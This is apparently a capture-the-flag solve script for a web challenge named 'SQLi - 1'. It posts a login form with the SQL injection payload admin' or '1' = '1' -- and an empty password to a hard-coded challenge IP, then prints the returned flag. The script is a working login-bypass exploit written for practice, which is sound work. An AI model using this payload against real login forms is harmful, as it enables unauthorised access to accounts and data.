"""
    Title: SQLi - 1
    Host: Secure-D CTF
    Category: Web
    Point: 50
    By Jusmistic
"""
import requests
def solve():
    """
        Solution for SQLi - 1 
        Login form bypass
    """
    payload = {"username":"admin' or '1' = '1' --","password":""} # ' or '1'='1' -- to bypass login
    req = requests.post("http://45.77.169.208:5000", data=payload)
    print(req.text) #print flag
solve()